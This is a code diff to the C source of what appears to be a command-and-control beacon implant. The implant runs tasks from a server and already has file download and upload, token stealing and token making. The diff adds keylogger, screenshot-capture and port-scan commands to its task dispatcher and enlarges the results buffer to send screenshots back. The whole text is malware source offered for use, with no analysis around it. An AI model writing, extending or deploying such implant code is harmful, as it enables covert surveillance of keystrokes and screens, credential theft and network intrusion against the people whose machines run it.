@@ -48,6 +48,9 @@
 #include "bof.h"
 #include "crypto.h"
 #include "token.h"
+#include "keylogger.h"
+#include "screenshot.h"
+#include "portscan.h"
 
 /* ── Runtime-configurable sleep (server can change via 'sleep' command) */
 static int g_sleep_ms   = 5000;
@@ -548,7 +551,7 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
         if (task_count == 0) goto do_sleep;
 
         /* Allocate results buffer for all tasks */
-        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256;
+        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256 + (4 * 1024 * 1024);
         char *results = (char *)malloc(results_cap);
         if (!results) goto do_sleep;
         size_t roff = 0;
@@ -586,6 +589,24 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
                 handle_download(args_decoded, out_b64);
             } else if (strcmp(tasks[t].command, "upload") == 0) {
                 handle_upload(args_decoded, out_b64);
+            } else if (strcmp(tasks[t].command, "screenshot") == 0) {
+                char *ss_buf = (char *)malloc(2 * 1024 * 1024);
+                if (ss_buf) {
+                    ss_buf[0] = '\0';
+                    handle_screenshot(ss_buf, 2 * 1024 * 1024);
+                    /* Use ss_buf instead of out_b64 for this result */
+                    if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
+                    roff += (size_t)snprintf(results + roff, results_cap - roff,
+                        "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
+                        tasks[t].id, ss_buf);
+                    free(ss_buf);
+                    continue;
+                }
+                b64_encode((unsigned char*)"Out of memory for screenshot", 28, out_b64);
+            } else if (strcmp(tasks[t].command, "portscan") == 0) {
+                handle_portscan(args_decoded, out_b64, BUF_SIZE);
+            } else if (strcmp(tasks[t].command, "keylogger") == 0) {
+                handle_keylogger(args_decoded, out_b64);
             } else if (strcmp(tasks[t].command, "steal_token") == 0) {
                 handle_steal_token(args_decoded, out_b64);
             } else if (strcmp(tasks[t].command, "make_token") == 0) {
